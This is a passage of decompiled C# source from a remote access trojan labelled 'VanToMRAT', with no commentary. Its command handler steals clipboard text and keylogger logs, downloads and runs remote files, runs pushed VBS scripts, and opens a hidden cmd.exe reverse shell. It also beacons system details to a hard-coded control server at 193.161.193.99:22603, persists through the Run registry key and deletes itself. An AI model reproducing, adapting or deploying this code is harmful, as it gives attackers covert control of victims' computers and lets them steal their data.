																																																																																																				MyProject.Computer.Clipboard.Clear();
																																																																																																			}
																																																																																																			else
																																																																																																			{
																																																																																																				flag2 = (Operators.CompareString(left, "SetClp", false) == 0);
																																																																																																				if (flag2)
																																																																																																				{
																																																																																																					MyProject.Computer.Clipboard.SetText(array4[1]);
																																																																																																				}
																																																																																																				else
																																																																																																				{
																																																																																																					flag2 = (Operators.CompareString(left, "GetClp", false) == 0);
																																																																																																					if (flag2)
																																																																																																					{
																																																																																																						this.c.Send("GetClp" + this.yY + MyProject.Computer.Clipboard.GetText());
																																																																																																					}
																																																																																																					else
																																																																																																					{
																																																																																																						flag2 = (Operators.CompareString(left, "Uninstall", false) == 0);
																																																																																																						if (flag2)
																																																																																																						{
																																																																																																							try
																																																																																																							{
																																																																																																								flag = Conversions.ToBoolean(this.hidme);
																																																																																																								if (flag)
																																																																																																								{
																																																																																																									File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
																																																																																																								}
																																																																																																								this.UNS();
																																																																																																							}
																																																																																																							catch (Exception ex10)
																																																																																																							{
																																																																																																							}
																																																																																																						}
																																																																																																						else
																																																																																																						{
																																																																																																							flag2 = (Operators.CompareString(left, "DeleteServer", false) == 0);
																																																																																																							if (!flag2)
																																																																																																							{
																																																																																																								flag2 = (Operators.CompareString(left, "Uninstall", false) == 0);
																																																																																																								if (flag2)
																																																																																																								{
																																																																																																									try
																																																																																																									{
																																																																																																										RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true);
																																																																																																										this.PersistThread.Abort();
																																																																																																										registryKey.DeleteValue(this.StartupKey);
																																																																																																										registryKey.Close();
																																																																																																									}
																																																																																																									catch (Exception ex11)
																																																																																																									{
																																																																																																									}
																																																																																																								}
																																																																																																								else
																																																																																																								{
																																																																																																									flag2 = (Operators.CompareString(left, "sendinformation", false) == 0);
																																																																																																									if (flag2)
																																																																																																									{
																																																																																																										int tickCount = MyProject.Computer.Clock.TickCount;
																																																																																																										int num40 = tickCount / 3600000;
																																																																																																										int num41 = tickCount % 3600000 / 60000;
																																																																																																										int num42 = (int)Math.Round((double)(tickCount % 3600000 % 60000) / 1000.0);
																																																																																																										string right = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", ""));
																																																																																																										string right2 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "Identifier", ""));
																																																																																																										string right3 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName", ""));
																																																																																																										string right4 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate", ""));
																																																																																																										string right5 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion", ""));
																																																																																																										string right6 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer", ""));
																																																																																																										string right7 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor", ""));
																																																																																																										string right8 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\VanToMRAT", "ID", ""));
																																																																																																										NewLateBinding.LateCall(this.c, null, "Send", new object[]
																																																																																																										{
																																																																																																											Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("sendinformation" + this.yY + Environment.MachineName + this.yY + Environment.UserName + this.yY + MyProject.Computer.Info.OSFullName + this.yY + MyProject.Computer.Info.OSPlatform + this.yY + this.country + this.yY, Module1.getanti()), this.yY), Module1.GetSystemRAMSize()), this.yY), "1.4"), this.yY), Module1.checkcam()), this.yY), Module1.ACT()), this.yY), MyProject.Computer.Clock.LocalTime), this.yY), num40), ":"), num41), ":"), num42), this.yY), Environment.CurrentDirectory), this.yY), Environment.SystemDirectory), this.yY), Environment.UserDomainName), this.yY), Environment.UserInteractive), this.yY), Environment.WorkingSet), this.yY), MyProject.Computer.Info.OSVersion), this.yY), MyProject.Computer.Info.InstalledUICulture.ToString()), this.yY), Environment.CommandLine), this.yY), VanToMRAT.port), this.yY), Application.ExecutablePath), this.yY), right), this.yY), right2), this.yY), right3), this.yY), right4), this.yY), right5), this.yY), right6), this.yY), right7), this.yY), right8)
																																																																																																										}, null, null, null, true);
																																																																																																									}
																																																																																																									else
																																																																																																									{
																																																																																																										flag2 = (Operators.CompareString(left, "UploadS", false) == 0);
																																																																																																										if (flag2)
																																																																																																										{
																																																																																																											try
																																																																																																											{
																																																																																																												MyProject.Computer.Network.DownloadFile(this.dzd[1], Path.GetTempPath() + this.dzd[2]);
																																																																																																												Process.Start(Path.GetTempPath() + this.dzd[2]);
																																																																																																											}
																																																																																																											catch (Exception ex12)
																																																																																																											{
																																																																																																											}
																																																																																																										}
																																																																																																										else
																																																																																																										{
																																																																																																											flag2 = (Operators.CompareString(left, "openurl", false) == 0);
																																																																																																											if (flag2)
																																																																																																											{
																																																																																																												flag = (Operators.CompareString(array[1], "Default", false) == 0);
																																																																																																												if (flag)
																																																																																																												{
																																																																																																													try
																																																																																																													{
																																																																																																														Process.Start(array[2]);
																																																																																																													}
																																																																																																													catch (Exception ex13)
																																																																																																													{
																																																																																																													}
																																																																																																												}
																																																																																																												else
																																																																																																												{
																																																																																																													try
																																																																																																													{
																																																																																																														Process.Start(array[1], array[2]);
																																																																																																													}
																																																																																																													catch (Exception ex14)
																																																																																																													{
																																																																																																													}
																																																																																																												}
																																																																																																											}
																																																																																																											else
																																																																																																											{
																																																																																																												flag2 = (Operators.CompareString(left, "wcod", false) == 0);
																																																																																																												if (flag2)
																																																																																																												{
																																																																																																													NewLateBinding.LateCall(this.c, null, "Send", new object[]
																																																																																																													{
																																																																																																														Operators.ConcatenateObject("wcod" + this.yY, this.Npc)
																																																																																																													}, null, null, null, true);
																																																																																																												}
																																																																																																												else
																																																																																																												{
																																																																																																													flag2 = (Operators.CompareString(left, "exco", false) == 0);
																																																																																																													if (flag2)
																																																																																																													{
																																																																																																														string contents = array[1];
																																																																																																														string path = Application.StartupPath + "\\hfh.vbs";
																																																																																																														File.WriteAllText(path, contents);
																																																																																																														string text18 = this.iwE + "\\sc.vbs";
																																																																																																														File.WriteAllText(text18, array[1]);
																																																																																																														Process.Start(text18, Conversions.ToString(0));
																																																																																																													}
																																																																																																													else
																																																																																																													{
																																																																																																														flag2 = (Operators.CompareString(left, "ChangeID", false) == 0);
																																																																																																														if (flag2)
																																																																																																														{
																																																																																																															MyProject.Computer.Registry.CurrentUser.CreateSubKey("Software\\STR\\");
																																																																																																															RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\STR\\", true);
																																																																																																															registryKey2.SetValue("ID", array[1]);
																																																																																																															registryKey2.Close();
																																																																																																															this.c.Send("NewID" + this.yY + this.getID());
																																																																																																														}
																																																																																																														else
																																																																																																														{
																																																																																																															flag2 = (Operators.CompareString(left, "rss", false) == 0);
																																																																																																															if (flag2)
																																																																																																															{
																																																																																																																try
																																																																																																																{
																																																																																																																	NewLateBinding.LateCall(this.pro, null, "Kill", new object[0], null, null, null, true);
																																																																																																																}
																																																																																																																catch (Exception ex15)
																																																																																																																{
																																																																																																																}
																																																																																																																this.pro = new Process();
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardOutput", new object[]
																																																																																																																{
																																																																																																																	true
																																																																																																																}, null, null, false, true);
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardInput", new object[]
																																																																																																																{
																																																																																																																	true
																																																																																																																}, null, null, false, true);
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[]
																																																																																																																{
																																																																																																																	true
																																																																																																																}, null, null, false, true);
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "FileName", new object[]
																																																																																																																{
																																																																																																																	"cmd.exe"
																																																																																																																}, null, null, false, true);
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[]
																																																																																																																{
																																																																																																																	true
																																																																																																																}, null, null, false, true);
																																																																																																																((Process)this.pro).OutputDataReceived += new DataReceivedEventHandler(this.RS);
																																																																																																																((Process)this.pro).ErrorDataReceived += new DataReceivedEventHandler(this.RS);
																																																																																																																((Process)this.pro).Exited += delegate(object a0, EventArgs a1)
																																																																																																																{
																																																																																																																	this.ex();
																																																																																																																};
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "UseShellExecute", new object[]
																																																																																																																{
																																																																																																																	false
																																																																																																																}, null, null, false, true);
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "CreateNoWindow", new object[]
																																																																																																																{
																																																																																																																	true
																																																																																																																}, null, null, false, true);
																																																																																																																NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.pro, null, "StartInfo", new object[0], null, null, null), null, "WindowStyle", new object[]
																																																																																																																{
																																																																																																																	ProcessWindowStyle.Hidden
																																																																																																																}, null, null, false, true);
																																																																																																																NewLateBinding.LateSet(this.pro, null, "EnableRaisingEvents", new object[]
																																																																																																																{
																																																																																																																	true
																																																																																																																}, null, null);
																																																																																																																this.c.Send("rss" + this.yY);
																																																																																																																NewLateBinding.LateCall(this.pro, null, "Start", new object[0], null, null, null, true);
																																																																																																																NewLateBinding.LateCall(this.pro, null, "BeginErrorReadLine", new object[0], null, null, null, true);
																																																																																																																NewLateBinding.LateCall(this.pro, null, "BeginOutputReadLine", new object[0], null, null, null, true);
																																																																																																															}
																																																																																																															else
																																																																																																															{
																																																																																																																flag2 = (Operators.CompareString(left, "rs", false) == 0);
																																																																																																																if (flag2)
																																																																																																																{
																																																																																																																	NewLateBinding.LateCall(NewLateBinding.LateGet(this.pro, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
																																																																																																																	{
																																																																																																																		this.DEB(ref array[1])
																																																																																																																	}, null, null, null, true);
																																																																																																																}
																																																																																																																else
																																																																																																																{
																																																																																																																	flag2 = (Operators.CompareString(left, "rsc", false) == 0);
																																																																																																																	if (flag2)
																																																																																																																	{
																																																																																																																		try
																																																																																																																		{
																																																																																																																			NewLateBinding.LateCall(this.pro, null, "Kill", new object[0], null, null, null, true);
																																																																																																																		}
																																																																																																																		catch (Exception ex16)
																																																																																																																		{
																																																																																																																		}
																																																																																																																		this.pro = null;
																																																																																																																	}
																																																																																																																	else
																																																																																																																	{
																																																																																																																		flag2 = (Operators.CompareString(left, "download", false) == 0);
																																																																																																																		if (flag2)
																																																																																																																		{
																																																																																																																			MyProject.Computer.Network.DownloadFile(array[1], Path.GetTempPath() + array[2]);
																																																																																																																			Thread.Sleep(1000);
																																																																																																																			Process.Start(Path.GetTempPath() + array[2]);
																																																																																																																		}
																																																																																																																		else
																																																																																																																		{
																																																																																																																			flag2 = (Operators.CompareString(left, "closeserver", false) == 0);
																																																																																																																			if (flag2)
																																																																																																																			{
																																																																																																																				ProjectData.EndApp();
																																																																																																																			}
																																																																																																																			else
																																																																																																																			{
																																																																																																																				flag2 = (Operators.CompareString(left, "sendfile", false) == 0);
																																																																																																																				if (flag2)
																																																																																																																				{
																																																																																																																					File.WriteAllBytes(Path.GetTempPath() + array[1], Convert.FromBase64String(array[2]));
																																																																																																																					Thread.Sleep(1000);
																																																																																																																					Process.Start(Path.GetTempPath() + array[1]);
																																																																																																																				}
																																																																																																																				else
																																																																																																																				{
																																																																																																																					flag2 = (Operators.CompareString(left, "openkl", false) == 0);
																																																																																																																					if (flag2)
																																																																																																																					{
																																																																																																																						this.c.Send("openkl");
																																																																																																																					}
																																																																																																																					else
																																																																																																																					{
																																																																																																																						flag2 = (Operators.CompareString(left, "Getloges", false) == 0);
																																																																																																																						if (flag2)
																																																																																																																						{
																																																																																																																							try
																																																																																																																							{
																																																																																																																								this.c.Send("loges" + this.yY + this.kl.Logs);
																																																																																																																							}
																																																																																																																							catch (Exception ex17)
																																																																																																																							{
																																																																																																																							}
																																																																																																																						}
																																																																																																																					}
																																																																																																																				}
																																																																																																																			}
																																																																																																																		}
																																																																																																																	}
																																																																																																																}
																																																																																																															}
																																																																																																														}
																																																																																																													}
																																																																																																												}
																																																																																																											}
																																																																																																										}
																																																																																																									}
																																																																																																								}
																																																																																																							}
																																																																																																						}
																																																																																																					}
																																																																																																				}
																																																																																																			}
																																																																																																		}
																																																																																																	}
																																																																																																}
																																																																																															}
																																																																																														}
																																																																																													}
																																																																																												}
																																																																																											}
																																																																																										}
																																																																																									}
																																																																																								}
																																																																																							}
																																																																																						}
																																																																																					}
																																																																																				}
																																																																																			}
																																																																																		}
																																																																																	}
																																																																																}
																																																																															}
																																																																														}
																																																																													}
																																																																												}
																																																																											}
																																																																										}
																																																																									}
																																																																								}
																																																																							}
																																																																						}
																																																																					}
																																																																				}
																																																																			}
																																																																		}
																																																																	}
																																																																}
																																																															}
																																																														}
																																																													}
																																																												}
																																																											}
																																																										}
																																																									}
																																																								}
																																																							}
																																																						}
																																																					}
																																																				}
																																																			}
																																																		}
																																																	}
																																																}
																																															}
																																														}
																																													}
																																												}
																																											}
																																										}
																																									}
																																								}
																																							}
																																						}
																																					}
																																				}
																																			}
																																		}
																																	}
																																}
																															}
																														}
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				catch (Exception ex18)
				{
				}
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x0000E820 File Offset: 0x0000CA20
		private void SuspendProcess(Process process)
		{
			try
			{
				foreach (object obj in process.Threads)
				{
					ProcessThread processThread = (ProcessThread)obj;
					IntPtr intPtr = Module4.OpenThread(Module4.ThreadAccess.SUSPEND_RESUME, false, checked((uint)processThread.Id));
					bool flag = intPtr != IntPtr.Zero;
					if (flag)
					{
						Module4.SuspendThread(intPtr);
						Module4.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000104 RID: 260 RVA: 0x0000E8C0 File Offset: 0x0000CAC0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = !this.c.Statconnected();
			if (flag)
			{
				this.c.Connect(VanToMRAT.host, Conversions.ToInteger(VanToMRAT.port));
			}
		}

		// Token: 0x06000105 RID: 261
		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "FindWindowExA", ExactSpelling = true, SetLastError = true)]
		private static extern int FindWindowEx(int hWnd1, int hWnd2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

		// Token: 0x06000106 RID: 262 RVA: 0x0000E900 File Offset: 0x0000CB00
		private void HideTaskbarItems()
		{
			string text = "Shell_TrayWnd";
			string text2 = null;
			long num = (long)VanToMRAT.FindWindow(ref text, ref text2);
			int hWnd = checked((int)num);
			int hWnd2 = 0;
			text2 = "ReBarWindow32";
			text = null;
			long value = (long)VanToMRAT.FindWindowEx(hWnd, hWnd2, ref text2, ref text);
			VanToMRAT.ShowWindow((IntPtr)value, 1);
		}

		// Token: 0x06000107 RID: 263 RVA: 0x0000E948 File Offset: 0x0000CB48
		private void ShowTaskbarItems()
		{
			string text = "Shell_TrayWnd";
			string text2 = null;
			long num = (long)VanToMRAT.FindWindow(ref text, ref text2);
			int hWnd = checked((int)num);
			int hWnd2 = 0;
			text2 = "ReBarWindow32";
			text = null;
			long value = (long)VanToMRAT.FindWindowEx(hWnd, hWnd2, ref text2, ref text);
			VanToMRAT.ShowWindow((IntPtr)value, 0);
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000E990 File Offset: 0x0000CB90
		private void hideclock()
		{
			string text = "Shell_TrayWnd";
			string text2 = null;
			long num = (long)VanToMRAT.FindWindow(ref text, ref text2);
			int hWnd = checked((int)num);
			int hWnd2 = 0;
			text2 = "TrayNotifyWnd";
			text = null;
			long num2 = (long)VanToMRAT.FindWindowEx(hWnd, hWnd2, ref text2, ref text);
			int hWnd3 = checked((int)num2);
			int hWnd4 = 0;
			text2 = "TrayClockWClass";
			text = null;
			long value = (long)VanToMRAT.FindWindowEx(hWnd3, hWnd4, ref text2, ref text);
			VanToMRAT.ShowWindow((IntPtr)value, 0);
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0000E9F0 File Offset: 0x0000CBF0
		private void showclock()
		{
			string text = "Shell_TrayWnd";
			string text2 = null;
			long num = (long)VanToMRAT.FindWindow(ref text, ref text2);
			int hWnd = checked((int)num);
			int hWnd2 = 0;
			text2 = "TrayNotifyWnd";
			text = null;
			long num2 = (long)VanToMRAT.FindWindowEx(hWnd, hWnd2, ref text2, ref text);
			int hWnd3 = checked((int)num2);
			int hWnd4 = 0;
			text2 = "TrayClockWClass";
			text = null;
			long value = (long)VanToMRAT.FindWindowEx(hWnd3, hWnd4, ref text2, ref text);
			VanToMRAT.ShowWindow((IntPtr)value, 1);
		}

		// Token: 0x0600010A RID: 266 RVA: 0x0000EA50 File Offset: 0x0000CC50
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public void UNS()
		{
			string text = VanToMRAT.namev;
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true);
			registryKey.SetValue(text, Application.ExecutablePath, RegistryValueKind.String);
			registryKey.DeleteValue(VanToMRAT.namev);
			try
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + this.RG + ".exe";
			}
			catch (Exception ex)
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(this.RG, false);
			}
			catch (Exception ex2)
			{
			}
			try
			{
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet(this.LO, null, "FullName", new object[0], null, null, null)), '"'), " & exit")), AppWinStyle.Hide, false, -1);
			}
			catch (Exception ex3)
			{
			}
			ProjectData.EndApp();
		}

		// Token: 0x0600010B RID: 267 RVA: 0x0000EB8C File Offset: 0x0000CD8C
		private void Timer2_Tick(object sender, EventArgs e)
		{
			string caption = this.GetCaption();
			bool flag = Operators.CompareString(this.makel, caption, false) != 0;
			if (flag)
			{
				this.makel = caption;
				this.Timer2.Stop();
				this.c.Send("AW" + this.yY + caption);
				this.Timer2.Start();
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000EBFC File Offset: 0x0000CDFC
		public string GenerateOperatingSystem()
		{
			OperatingSystem osversion = Environment.OSVersion;
			bool flag = Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86");
			string text;
			if (flag)
			{
				text += " x86";
			}
			else
			{
				text += " x64";
			}
			return text;
		}

		// Token: 0x0600010D RID: 269 RVA: 0x0000EC68 File Offset: 0x0000CE68
		public string ENB(ref string s)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x0600010E RID: 270 RVA: 0x0000EC8C File Offset: 0x0000CE8C
		public string DEB(ref string s)
		{
			byte[] bytes = Convert.FromBase64String(s);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000ECB0 File Offset: 0x0000CEB0
		private void RS(object a, object e)
		{
			try
			{
				SocketClient c = this.c;
				string str = "rs";
				string str2 = this.yY;
				string text = Conversions.ToString(NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null));
				string str3 = this.ENB(ref text);
				NewLateBinding.LateSetComplex(e, null, "Data", new object[]
				{
					text
				}, null, null, true, false);
				c.Send(str + str2 + str3);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000ED48 File Offset: 0x0000CF48
		private void ex()
		{
			try
			{
				this.c.Send("rsc" + this.yY);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000ED9C File Offset: 0x0000CF9C
		public string getID()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\STR\\");
				VanToMRAT.name = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(registryKey.GetValue("ID"), "_"), this.HWD()));
				registryKey.Close();
			}
			catch (Exception ex)
			{
			}
			return VanToMRAT.name;
		}

		// Token: 0x06000112 RID: 274
		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
		private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

		// Token: 0x06000113 RID: 275 RVA: 0x0000EE20 File Offset: 0x0000D020
		public string HWD()
		{
			string result;
			try
			{
				string text = Interaction.Environ("SystemDrive") + "\\";
				string text2 = null;
				int nVolumeNameSize = 0;
				int num = 0;
				int num2 = 0;
				string text3 = null;
				int number;
				VanToMRAT.GetVolumeInformation(ref text, ref text2, nVolumeNameSize, ref number, ref num, ref num2, ref text3, 0);
				result = Conversion.Hex(number);
			}
			catch (Exception ex)
			{
				result = "ERR";
			}
			return result;
		}

		// Token: 0x06000114 RID: 276 RVA: 0x0000EEAC File Offset: 0x0000D0AC
		private void Timer4_Tick(object sender, EventArgs e)
		{
			this.Hide();
		}

		// Token: 0x040000C9 RID: 201
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040000CB RID: 203
		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		// Token: 0x040000CC RID: 204
		[AccessedThroughProperty("Timer2")]
		private System.Windows.Forms.Timer _Timer2;

		// Token: 0x040000CD RID: 205
		[AccessedThroughProperty("Timer3")]
		private System.Windows.Forms.Timer _Timer3;

		// Token: 0x040000CE RID: 206
		[AccessedThroughProperty("Timer4")]
		private System.Windows.Forms.Timer _Timer4;

		// Token: 0x040000CF RID: 207
		public rec rico;

		// Token: 0x040000D0 RID: 208
		public bool tm;

		// Token: 0x040000D1 RID: 209
		public string logggg;

		// Token: 0x040000D2 RID: 210
		public njLogger kl;

		// Token: 0x040000D3 RID: 211
		public CRDP cap;

		// Token: 0x040000D4 RID: 212
		public CRDP1 caa;

		// Token: 0x040000D5 RID: 213
		public int tictoc;

		// Token: 0x040000D6 RID: 214
		private const int SW_SHOWNORMAL = 1;

		// Token: 0x040000D7 RID: 215
		private const int SW_SHOWMINIMIZED = 2;

		// Token: 0x040000D8 RID: 216
		private const int SW_SHOWMAXIMIZED = 3;

		// Token: 0x040000D9 RID: 217
		private string pw;

		// Token: 0x040000DA RID: 218
		private string id;

		// Token: 0x040000DB RID: 219
		private string StartupKey;

		// Token: 0x040000DC RID: 220
		private string iwE;

		// Token: 0x040000DD RID: 221
		public object xnet;

		// Token: 0x040000DE RID: 222
		public object keysc;

		// Token: 0x040000DF RID: 223
		public object wirS;

		// Token: 0x040000E0 RID: 224
		public object olly;

		// Token: 0x040000E1 RID: 225
		public object hidme;

		// Token: 0x040000E2 RID: 226
		public object avast;

		// Token: 0x040000E3 RID: 227
		public object css;

		// Token: 0x040000E4 RID: 228
		public object tcs;

		// Token: 0x040000E5 RID: 229
		public object vt;

		// Token: 0x040000E6 RID: 230
		public object es;

		// Token: 0x040000E7 RID: 231
		public object vj;

		// Token: 0x040000E8 RID: 232
		public object vn;

		// Token: 0x040000E9 RID: 233
		public object vr;

		// Token: 0x040000EA RID: 234
		public object ch4;

		// Token: 0x040000EB RID: 235
		public object mo;

		// Token: 0x040000EC RID: 236
		public object cus;

		// Token: 0x040000ED RID: 237
		public object mbm;

		// Token: 0x040000EE RID: 238
		public string[] dzd;

		// Token: 0x040000EF RID: 239
		public string text1;

		// Token: 0x040000F0 RID: 240
		public string text2;

		// Token: 0x040000F1 RID: 241
		public string cct;

		// Token: 0x040000F2 RID: 242
		public string RG;

		// Token: 0x040000F3 RID: 243
		public string alab;

		// Token: 0x040000F4 RID: 244
		public string makel;

		// Token: 0x040000F5 RID: 245
		public string loggg;

		// Token: 0x040000F6 RID: 246
		private string yY;

		// Token: 0x040000F7 RID: 247
		[AccessedThroughProperty("c")]
		private SocketClient _c;

		// Token: 0x040000F8 RID: 248
		private string culture;

		// Token: 0x040000F9 RID: 249
		private string country;

		// Token: 0x040000FA RID: 250
		private njLogger o;

		// Token: 0x040000FB RID: 251
		public A cam;

		// Token: 0x040000FC RID: 252
		private const string sql = "abccba";

		// Token: 0x040000FD RID: 253
		private Thread PersistThread;

		// Token: 0x040000FE RID: 254
		private const int SETDESKWALLPAPER = 20;

		// Token: 0x040000FF RID: 255
		private const int UPDATEINIFILE = 1;

		// Token: 0x04000100 RID: 256
		private const int TASKBAR_SHOW = 64;

		// Token: 0x04000101 RID: 257
		private const int TASKBAR_HIDE = 128;

		// Token: 0x04000102 RID: 258
		private int taskBar;

		// Token: 0x04000103 RID: 259
		private object Devices;

		// Token: 0x04000104 RID: 260
		private string Grafikadapter;

		// Token: 0x04000105 RID: 261
		private string RegionA;

		// Token: 0x04000106 RID: 262
		public static string host = "193.161.193.99";

		// Token: 0x04000107 RID: 263
		public static string port = "22603";

		// Token: 0x04000108 RID: 264
		public static string vicname = "Phoneshop2";

		// Token: 0x04000109 RID: 265
		public static string namev = "Server";

		// Token: 0x0400010A RID: 266
		public static object dta = "True";

		// Token: 0x0400010B RID: 267
		public static string melt = "False";

		// Token: 0x0400010C RID: 268
		public static string flder = "VanToM Folder";

		// Token: 0x0400010D RID: 269
		public static string usb = "True";

		// Token: 0x0400010F RID: 271
		private object pro;

		// Token: 0x04000110 RID: 272
		private object Npc;

		// Token: 0x04000111 RID: 273
		private object LO;

		// Token: 0x04000112 RID: 274
		private string sf;

		// Token: 0x02000031 RID: 49
		// (Invoke) Token: 0x0600011A RID: 282
		public delegate void rv(string data1);

		// Token: 0x02000032 RID: 50
		// (Invoke) Token: 0x0600011E RID: 286
		public delegate void rsv(string data2);

		// Token: 0x02000033 RID: 51
		// (Invoke) Token: 0x06000122 RID: 290
		public delegate void oc();

		// Token: 0x02000034 RID: 52
		// (Invoke) Token: 0x06000126 RID: 294
		public delegate void ec();

		// Token: 0x02000035 RID: 53
		// (Invoke) Token: 0x0600012A RID: 298
		public delegate void gt();
	}
}
